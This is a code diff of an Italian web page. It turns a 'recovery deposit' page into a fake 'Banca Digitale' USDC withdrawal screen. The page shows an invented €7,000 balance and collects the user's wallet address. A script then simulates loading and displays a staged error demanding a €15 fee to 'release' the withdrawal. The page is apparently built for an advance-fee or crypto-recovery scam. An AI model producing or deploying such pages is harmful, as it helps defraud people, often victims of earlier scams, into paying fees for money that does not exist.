@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Deposito di Recupero</title>
+  <title>Banca Digitale - Prelievo USDC</title>
   <style>
     body {
       margin: 0;
@@ -14,32 +14,42 @@
       align-items: center;
       justify-content: center;
       min-height: 100vh;
+      padding: 16px;
     }
 
-    .page {
-      opacity: 0;
-      transform: translateY(20px);
-      transition: opacity 0.6s ease, transform 0.6s ease;
-      display: none;
-      width: 100%;
-      max-width: 420px;
+    .card {
       background: #fff;
       border-radius: 12px;
       padding: 24px;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 420px;
       text-align: center;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.1);
     }
 
-    .page.active {
-      display: block;
-      opacity: 1;
-      transform: translateY(0);
+    .logo {
+      font-size: 22px;
+      font-weight: 700;
+      color: #0066cc;
+      margin-bottom: 12px;
     }
 
     h1 {
       font-size: 20px;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
       color: #333;
+    }
+
+    .balance {
+      font-size: 16px;
+      margin-bottom: 12px;
+      color: #555;
+    }
+
+    .amount {
+      font-size: 18px;
+      margin-bottom: 16px;
+      font-weight: 600;
     }
 
     .loader {
@@ -50,8 +60,8 @@
       border-radius: 50%;
       margin: 20px auto;
       animation: spin 1s linear infinite;
+      display: none;
     }
-
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .btn {
@@ -64,58 +74,123 @@
       font-weight: 600;
       cursor: pointer;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      margin-top: 20px;
+      margin-top: 12px;
       width: 100%;
     }
 
-    .next-content {
-      font-size: 16px;
-      color: #444;
-      margin-top: 20px;
+    .form-box {
+      display: none;
+      margin-top: 16px;
+      text-align: left;
     }
 
-    .assurance {
+    .form-box label {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 4px;
+      display: block;
+    }
+
+    .form-box input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin-bottom: 12px;
+      font-size: 15px;
+    }
+
+    .error {
+      display: none;
+      margin-top: 20px;
+      padding: 14px;
+      background: rgba(255,92,92,0.1);
+      border: 1px solid #ff5c5c;
+      border-radius: 8px;
+      color: #c00;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .tx-info {
+      display: none;
       margin-top: 16px;
       font-size: 14px;
+      text-align: left;
+      background: #f9f9f9;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+    }
+
+    .tx-info strong {
       color: #0066cc;
-      font-weight: 600;
+    }
+
+    @media (max-width: 480px) {
+      h1 { font-size: 18px; }
+      .amount { font-size: 16px; }
+      .btn { font-size: 15px; }
     }
   </style>
 </head>
 <body>
-  <!-- Prima pagina -->
-  <div class="page active" id="page1">
-    <h1>Deposito di Recupero in Arrivo</h1>
-    <div class="loader"></div>
-    <button class="btn" id="acceptBtn">Accetta Deposito</button>
-  </div>
+  <div class="card">
+    <div class="logo">Banca Digitale</div>
+    <h1>Prelievo USDC</h1>
+    <div class="balance">Saldo disponibile: €7.000</div>
+    <div class="amount">Importo massimo: <strong>7.000 USDC</strong></div>
+    <button class="btn" id="withdrawBtn">Preleva</button>
 
-  <!-- Seconda pagina -->
-  <div class="page" id="page2">
-    <h1>Deposito Accettato</h1>
-    <div class="next-content">
-      Hai accettato con successo il deposito di recupero.<br />
-      Procedi con i prossimi passaggi della transazione.
+    <div class="form-box" id="formBox">
+      <label for="walletAddress">Indirizzo Wallet USDC</label>
+      <input type="text" id="walletAddress" placeholder="Inserisci il tuo indirizzo USDC" />
+      <button class="btn" id="confirmBtn">Conferma Prelievo</button>
     </div>
-    <div class="assurance">
-      ✅ Nota di garanzia: Il pagamento sarà ricevuto entro 6–10 secondi dopo la conferma.
+
+    <div class="loader" id="loader"></div>
+
+    <div class="error" id="errorBox">
+      ⚠️ Errore transazione: Commissione non completata.<br />
+      Per confermare e rilasciare il prelievo di 7.000 USDC è necessario pagare una commissione di <strong>€15</strong>.
+    </div>
+
+    <div class="tx-info" id="txInfo">
+      <div><strong>Status:</strong> Bloccato</div>
+      <div><strong>TXID:</strong> Non disponibile</div>
+      <div><strong>Messaggio:</strong> Commissione di €15 richiesta per completare la verifica</div>
     </div>
   </div>
 
   <script>
-    const acceptBtn = document.getElementById('acceptBtn');
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const formBox = document.getElementById('formBox');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const loader = document.getElementById('loader');
+    const errorBox = document.getElementById('errorBox');
+    const txInfo = document.getElementById('txInfo');
 
-    acceptBtn.addEventListener('click', () => {
-      // Fade out page1
-      page1.classList.remove('active');
+    withdrawBtn.addEventListener('click', () => {
+      withdrawBtn.style.display = 'none';
+      formBox.style.display = 'block';
+    });
+
+    confirmBtn.addEventListener('click', () => {
+      const address = document.getElementById('walletAddress').value.trim();
+      if (!address) {
+        alert("Inserisci il tuo indirizzo USDC.");
+        return;
+      }
+
+      formBox.style.display = 'none';
+      loader.style.display = 'block';
+
+      // Simula caricamento di 5 secondi
       setTimeout(() => {
-        page1.style.display = 'none';
-        // Fade in page2
-        page2.style.display = 'block';
-        setTimeout(() => page2.classList.add('active'), 50);
-      }, 600); // matches transition duration
+        loader.style.display = 'none';
+        errorBox.style.display = 'block';
+        txInfo.style.display = 'block';
+      }, 5000);
     });
   </script>
 </body>
